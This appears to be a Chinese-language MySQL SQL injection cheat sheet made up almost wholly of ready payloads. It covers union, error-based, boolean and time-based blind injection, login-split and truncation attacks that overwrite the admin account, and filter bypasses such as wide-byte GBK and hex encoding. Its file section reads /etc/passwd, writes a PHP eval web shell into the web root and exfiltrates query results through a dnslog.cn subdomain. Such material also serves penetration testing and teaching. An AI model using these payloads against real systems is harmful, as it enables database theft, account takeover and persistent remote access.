# 基础注入

## 联合查询

- 若前面的查询结果不为空，则返回两次查询的值：
- 若前面的查询结果为空，则只返回union查询的值：

- 关键字`union select`
- 需要字段数对应

```sql
常用Payload：

# 查询表名
' union select group_concat(table_name) from information_schema.tables where table_schema=database()%23
# 查询字段名
' union select group_concat(column_name) from information_schema.columns where table_name='table1'%23
```

## 报错注入

报错注入是利用mysql在出错的时候会引出查询信息的特征，常用的报错手段有如下10种：

```sql
# 修改select user() 字段 获取不同的信息

# 1.floor()
select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

# 2.extractvalue()
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

# 3.updatexml()
select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

# 4.geometrycollection()
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

# 5.multipoint()

select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

6.polygon()

select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

7.multipolygon()

select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

8.linestring()

select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

9.multilinestring()

select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

10.exp()

select * from test where id=1 and exp(~(select * from(select user())a));
```

## 布尔盲注

常见的布尔盲注场景有两种，一是返回值只有True或False的类型，二是Order by盲注。

**返回值只有True或False的类型**

如果查询结果不为空，则返回True（或者是Success之类的），否则返回False

这种注入比较简单，可以挨个猜测表名、字段名和字段值的字符，通过返回结果判断猜测是否正确

```
例：parameter=’ or ascii(substr((select database()) ,1,1))<115—+
```

**Orderby盲注**

order by rand(True)和order by rand(False)的结果排序是不同的，可以根据这个不同来进行盲注：

```
例：order by rand(database()='pdotest')
```

返回了True的排序，说明database()=’pdotest’是正确的值

## 时间盲注

其实大多数页面，即使存在sql注入也基本是不会有回显的，因此这时候就要用延时来判断查询的结果是否正确。

常见的时间盲注有：

**1.sleep(x)**

```sql
id=' or sleep(3)%23

id=' or if(ascii(substr(database(),1,1))>114,sleep(3),0)%23
```

查询结果正确，则延迟3秒，错误则无延时。

**2.benchmark()**

通过大量运算来模拟延时：

```sql
id=' or benchmark(10000000,sha(1))%23

id=' or if(ascii(substr(database(),1,1))>114,benchmark(10000000,sha(1)),0)%23
```

本地测试这个值大约可延时3秒：

**3.笛卡尔积**

计算笛卡尔积也是通过大量运算模拟延时：

```sql
select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C

select balabala from table1 where '1'='2' or if(ascii(substr(database(),1,1))>0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)
```

笛卡尔积延时大约也是3秒

## HTTP头注入

注入手法和上述相差不多，就是注入点发生了变化

## HTTP分割注入

常见场景,登录处SQL语句如下，注释符号被过滤

```sql
select xxx from xxx where username=’xxx’ and password=’xxx’
```

```sql
# 方法一
username=1' or extractvalue/*
password=1*/(1,concat(0x7e,(select database()),0x7e))or'

SQL语句最终变为
select xxx from xxx where username='1' or extractvalue/*’ and password=’*/(1,concat(0x7e,(select database()),0x7e))or''

# 方法二
username=1' or if(ascii(substr(database(),1,1))=115,sleep(3),0) or '1
password=1
select * from users where username='1' or if(ascii(substr(database(),1,1))>0,sleep(3),0) or '1' and password='1'
```

## 二次注入

二次注入主要出现在`update`和`select`结合点，如注册之后在登录

攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题

## SQL约束攻击

假如注册时username参数在mysql中为**字符串**类型，并且有**unique属性**，设置了长度为VARCHAR(20)。

则我们注册一个username为admin[20个空格]asd的用户名，则在mysql中首先会判断是否有重复，若无重复，则会**截取前20个字符**加入到数据库中，所以数据库存储的数据为admin[20个空格]，而进行登录的时候，SQL语句会**忽略空格**，因此我们相当于覆写了admin账号。

# 基础绕过

## 大小写绕过

```
用于过滤时没有匹配大小写的情况：

SelECt * from table;
```

## 双写绕过

```
用于将禁止的字符直接删掉的过滤情况如：

preg_replace(‘/select/‘,’’,input)

则可用seselectlect from xxx来绕过，在删除一个select后剩下的就是select from xxx
```

## 绕过空格

```
当空格被过滤时，可以使用/**/ () %0a %09进行绕过
```

## 使用16进制绕过特定字符

如果在查询字段名的时候表名被过滤，或是数据库中某些特定字符被过滤，则可用16进制绕过：

```
select column_name from information_schema.columns where table_name=0x7573657273;
```

0x7573657273为users的16进制

**只能针对表名，字段名等，内置函数关键字，不能使用16进制替代**

## 宽字节、Latin1默认编码

**宽字节注入**

用于**单引号被转义**，但编码为**gbk编码**的情况下，用特殊字符将其与反斜杠合并，构成一个特殊字符：

```
username = %df'#
经gbk解码后变为：
select * from users where username ='運'#
```

成功闭合了单引号。

**Latin1编码**

Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有而utf8中没有的字符，而Mysql是如何处理这些字符的呢？**直接忽略**

于是我们可以输入`?username=admin%c2`，存储至表中就变为了admin

上面的`%c2`可以换为`%c2-%ef`之间的任意字符

## 常见字符的替代

```
and -> &&
or -> ||
空格-> /**/ -> %a0 -> %0a -> +
# -> --+ -> ;%00(php<=5.3.4) -> or '1'='1
= -> like -> regexp -> <> -> in
注：regexp为正则匹配，利用正则会有些新的注入手段
```

## 逗号被过滤

```sql
# 用join代替：
-1 union select 1,2,3
-1 union select * from (select 1)a join (select 2)b join (select 3)c%23

# limit：
limit 2,1
limit 1 offset 2

# substr:
substr(database(),5,1)
substr(database() from 5 for 1) from为从第几个字符开始，for为截取几个
substr(database() from 5)
# 如果for也被过滤了
mid(REVERSE(mid(database()from(-5)))from(-1)) reverse是反转，mid和substr等同

# if:
if(database()=’xxx’,sleep(3),1)
id=1 and databse()=’xxx’ and sleep(3)
select case when database()=’xxx’ then sleep(5) else 0 end
```

## limit被过滤

```sql
select user from users limit 1

加限制条件，如：

select user from users group by user_id having user_id = 1 (user_id是表中的一个column)
```

## information_schema被过滤

```sql
innodb引擎可用mysql.innodb_table_stats、innodb_index_stats，日志将会把表、键的信息记录到这两个表中

除此之外，系统表sys.schema_table_statistics_with_buffer、sys.schema_auto_increment_columns用于记录查询的缓存，某些情况下可代替information_schema
```

# 文件读写

## 读写权限

在进行MySQL文件读写操作之前要先查看是否拥有权限，mysql文件权限存放于mysql表的file_priv字段，对应不同的User，如果可以读写，则数据库记录为Y，反之为N：

我们可以通过user()查看当前用户是什么，如果对应用户具有读写权限，则往下看，反之则放弃这条路找其他的方法。

除了要查看用户权限，还有一个地方要查看，即**secure-file-priv**。它是一个系统变量，用于限制读写功能，它的值有三种：

（1）无内容，即无限制

（2）为NULL，表示禁止文件读写

（3）为目录名，表示仅能在此目录下读写

该配置项存放在`my.ini`中，修改之后必须重启mysql重新加载配置文件

## 读文件

如果满足上述2个条件，则可尝试读写文件了。

常用的读文件的语句有如下几种：

```
select load_file(file_path);
load data infile "/etc/passwd" into table 库里存在的表名 FIELDS TERMINATED BY 'n'; #读取服务端文件
load data local infile "/etc/passwd" into table 库里存在的表名 FIELDS TERMINATED BY 'n'; #读取客户端文件
```

需要注意的是，file_path必须为绝对路径，且反斜杠需要转义：

## 写文件

```
select 1,"<?php eval($_POST['cmd']);?>" into outfile '/var/www/html/1.php';
select 2,"<?php eval($_POST['cmd']);?>" into dumpfile '/var/www/html/1.php';
```

当secure_file_priv值为NULL时，可用生成日志的方法绕过：

```
set global general_log_file = '/var/www/html/1.php';
set global general_log = on;
```

日志除了general_log还有其他许多日志，实际场景中需要有足够的写入日志的权限，且需要堆叠注入的条件方可采用该方法，因此利用非常困难。

## DNS外带注入

若用户访问DNS服务器，则会在DNS日志中留下记录。如果请求中带有SQL查询的信息，则信息可被带出到DNS记录中。

利用条件：

1.secure_file_priv为空且有文件读取权限

2.目标为windows（利用了UNC，Linux不可行）

3.无回显且无法时间盲注

利用方法：

可以找一个免费的DNSlog：http://dnslog.cn/

进入后可获取一个子域名，执行：

```
select load_file(concat('\\',(select database()),'.子域名.dnslog.cn'));
```

相当于访问了select database().子域名.dnslog.cn，于是会留下DNSLOG记录，可从这些记录中查看SQL返回的信息。
